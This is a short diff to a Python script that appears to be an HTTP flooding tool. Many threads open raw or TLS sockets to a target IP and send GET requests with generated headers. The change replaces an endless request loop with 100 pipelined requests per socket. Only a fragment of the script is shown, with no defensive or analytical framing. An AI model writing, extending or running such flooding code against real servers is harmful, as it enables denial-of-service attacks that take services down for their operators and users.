@@ -66,19 +66,16 @@ def send_request():
                 context = ssl.create_default_context()
                 sock = context.wrap_socket(sock, server_hostname=ip)
             
-            # Create HTTP GET request
-            request = f"GET {path} HTTP/1.1\r\nHost: {ip}\r\n{rqheader()}"
-            sock.sendall(request.encode())
-
-            # Optionally, receive and discard response
-            print("Request Sent successful")
+            # Send 100 requests in a loop
+            for _ in range(100):
+                request = f"GET {path} HTTP/1.1\r\nHost: {ip}\r\n{rqheader()}"
+                sock.sendall(request.encode())
     except Exception as e:
         print(f"Request error: {e}")
 
 def thread_task():
-    # Each thread sends continuous requests
-    while True:
-        send_request()
+    # Each thread will send 100 requests
+    send_request()
 
 # Start the threads
 thread_list = []
